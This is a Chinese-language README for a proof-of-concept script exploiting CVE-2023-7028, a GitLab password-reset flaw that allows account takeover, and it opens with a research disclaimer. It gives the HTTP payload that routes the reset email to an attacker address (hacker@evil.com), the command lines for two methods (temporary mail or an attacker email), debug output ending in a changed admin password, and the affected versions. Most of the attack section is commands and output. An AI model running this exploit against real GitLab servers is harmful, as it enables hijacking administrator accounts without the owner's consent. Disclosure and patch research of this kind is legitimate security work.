CVE-2023-7028 | 帐户接管 Gitlab
免责声明
这段代码是该漏洞的概念证明，我不会敦促任何人在他们不拥有的 gitlab 实例上使用它。
该工具仅为研究和教育目的而开发，我对您可能使用它的任何行为不承担任何责任。

描述：
CVE-2023-7028 是指帐户接管漏洞，该漏洞允许用户无需用户交互即可控制 gitlab 管理员帐户。

该漏洞存在于重置密码时的电子邮件管理中。攻击者可以提供 2 个电子邮件，重置代码将发送给这两个电子邮件。
因此，可以提供目标帐户以及攻击者的电子邮件地址，并重置管理员密码。
（Gitlab 指出，两因素身份验证可防止此漏洞被利用，因为攻击者即使在重置密码后也无法登录。）

该漏洞由asterion04发现

有效负载：
这是一个示例有效负载

user[email][]=my.target@example.com&user[email][]=hacker@evil.com
概念验证：
方法 1：使用临时电子邮件
python3 ./CVE-2023-7028.py -u https://gitlab.example.com/ -t my.target@example.com

[DEBUG] Getting temporary mail
[DEBUG] Scrapping available domains on 1secmail.com
[DEBUG] 8 domains found
[DEBUG] Temporary mail: 6grp7ert9y@laafd.com
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = bc91lpzwTOaY9dg5SWjLvvDDb61j6ZunCX4DXYlSnWz9Y3zK35SPiLNShhrDrPVDgY_AzQjzpD5qVt2WXeolog
[DEBUG] Sending reset password request
[DEBUG] Emails sended to my.target@example.com and hacker@evil.com !
[DEBUG] Waiting mail, sleeping for 7.5 seconds
[DEBUG] Getting link using temp-mail | Try N°1 on 5
[DEBUG] Getting last mail for 6grp7ert9y@laafd.com
[DEBUG] 1 mail(s) found
[DEBUG] Reading the last one
[DEBUG] Generating new password
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = RN6gypVz7Zxtu2zRsJmKPsDHNumIH_UPvdn7aQoWRBnUcqmW1hcu8kYcMvI6XbTDsYuZieMFypbe8SWi3q781w
[DEBUG] Changing password to l3mG2v2XN4UBzbN18ZkW
[DEBUG] CVE_2023_7028 succeed !
        You can connect on https://gitlab.example.com/users/sign_in
        Username: my.target@example.com
        Password: l3mG2v2XN4UBzbN18ZkW
方法2：使用恶意电子邮件
python3 ./CVE-2023-7028.py -u https://gitlab.example.com/ -t my.target@example.com -e hacker@evil.com

[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = 1Yt1EUeWSL-oiSV7v1Z6ghdCDG3w0FFCQB8Uc5B5GAodVNJ26OlPT8HtYYleGXB9F0otas3gnHOtRfhFall8pQ
[DEBUG] Sending reset password request
[DEBUG] Emails sended to my.target@example.com and hacker@evil.com !
        Input link received by mail: https://gitlab.example.com/users/password/edit?reset_password_token=U8PSU7DXdebdTD3GjMiX
[DEBUG] Generating new password
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = N7gs43C9ZMxdniA9UEzzfH2Rlhgejt75M1Kw88vaarP_Z4uE38JjPDT6ZM-xA_mDfZm3HyO-E8jeCFzFMfoOHA
[DEBUG] Changing password to EU7XIYjlawjb5tH2jgmU
[DEBUG] CVE_2023_7028 succeed !
        You can connect on https://gitlab.example.com/users/sign_in
        Username: my.target@example.com
        Password: EU7XIYjlawjb5tH2jgmU
帮助
$ python3 .\CVE-2023-7028.py -h
usage: CVE-2023-7028.py [-h] -u URL -t TARGET [-e EVIL]

This tool automates CVE-2023-7028 on gitlab

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Gitlab url
  -t TARGET, --target TARGET
                        Target email
  -e EVIL, --evil EVIL  Evil email
  -p PASSWORD, --password PASSWORD
                        Password
笔记：
如果没有--evil指定攻击者电子邮件地址的选项，该脚本将使用公共临时邮件来查找密码重置链接。
=>如果在渗透测试期间使用此 poc，请小心。

相关版本
16.1至16.1.5
16.2至16.2.8
16.3至16.3.6
16.4至16.4.4
16.5 至 16.5.5
16.6至16.6.3
16.7至16.7.1
参考：
https://about.gitlab.com/releases/2024/01/11/ritic-security-release-gitlab-16-7-2-released/
https://docs.gitlab.com/ee/install/docker.html
https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0030/
https://github.com/Vozec/CVE-2023-7028